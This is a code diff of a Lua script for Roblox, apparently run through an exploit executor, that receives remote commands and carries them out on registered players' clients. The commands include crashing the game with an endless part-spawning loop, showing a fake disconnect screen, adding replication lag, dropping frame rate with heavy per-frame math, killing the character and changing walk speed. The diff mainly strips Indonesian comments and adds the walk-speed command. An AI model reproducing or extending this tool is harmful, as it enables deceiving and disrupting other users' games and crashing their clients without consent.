@@ -15,7 +15,7 @@ local function stopLoops()
     if orbitConnection then orbitConnection:Disconnect(); orbitConnection = nil end
     if spasmConnection then spasmConnection:Disconnect(); spasmConnection = nil end
     if lagConnection then lagConnection:Disconnect(); lagConnection = nil end
-    settings().Network.IncomingReplicationLag = 0 -- Reset lag ke normal
+    settings().Network.IncomingReplicationLag = 0
 end
 
 local function registerPlayer()
@@ -63,22 +63,23 @@ local function executeCommand(cmdData)
     
     stopLoops()
     
-    -- === PERINTAH BARU & PERBAIKAN IY ===
-    
-    if command == "reset" then
+    -- === DAFTAR EKSEKUSI COMMAND ===
+    if command == "walkspeed" then
+        if hum and extra then
+            local speed = tonumber(extra)
+            if speed then hum.WalkSpeed = speed end
+        end
+        
+    elseif command == "reset" then
         if hum then hum.Health = 0 end
         
     elseif command == "exit" then
-        game:Shutdown() -- Menutup game secara bersih jika didukung executor
+        game:Shutdown()
         
     elseif command == "crash" then
-        -- Memaksa memory leak / pembekuan total thread agar game Roblox langsung crash/keluar mendadak
-        while true do
-            local _ = Instance.new("Part", workspace)
-        end
+        while true do local _ = Instance.new("Part", workspace) end
         
     elseif command == "fakedisconnect" then
-        -- Memunculkan UI disconnect tiruan bawaan Roblox
         local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
         gui.IgnoreGuiInset = true
         local bg = Instance.new("Frame", gui)
@@ -110,30 +111,22 @@ local function executeCommand(cmdData)
         r.BackgroundTransparency = 1
         
     elseif command == "replag" then
-        -- Menunda pertukaran data jaringan agar mereka terlihat patah-patah/lag parah di server
-        settings().Network.IncomingReplicationLag = 10 -- Menunda masuknya data selama 10 detik
+        settings().Network.IncomingReplicationLag = 10
         
     elseif command == "fpsdrop" then
-        -- Menurunkan performa FPS secara drastis menggunakan kalkulasi berat di setiap frame matematika
         lagConnection = RunService.Heartbeat:Connect(function()
-            for i = 1, 3000000 do
-                local _ = math.sin(i) * math.cos(i)
-            end
+            for i = 1, 3000000 do local _ = math.sin(i) * math.cos(i) end
         end)
         
     elseif command == "antiy" then
-        -- Menghentikan paksa Fly, Noclip milik Infinite Yield dengan merestrukturisasi state objek karakter
         if hum and root then
             hum.PlatformStand = false
             for _, part in ipairs(char:GetDescendants()) do
-                if part:IsA("BasePart") then
-                    part.CanCollide = true -- Mematikan Noclip (Karakter kembali menabrak objek)
-                end
+                if part:IsA("BasePart") then part.CanCollide = true end
             end
-            -- Memaksa kecepatan berjalan kembali lambat/normal jika mereka mengubah flyspeed/walkspeed
             hum.WalkSpeed = 16 
             local bv = root:FindFirstChildOfClass("BodyVelocity") or root:FindFirstChildOfClass("BodyGyro")
-            if bv then bv:Destroy() end -- Menghancurkan pendorong posisi terbang IY
+            if bv then bv:Destroy() end
         end
         
     elseif command == "freeze" then
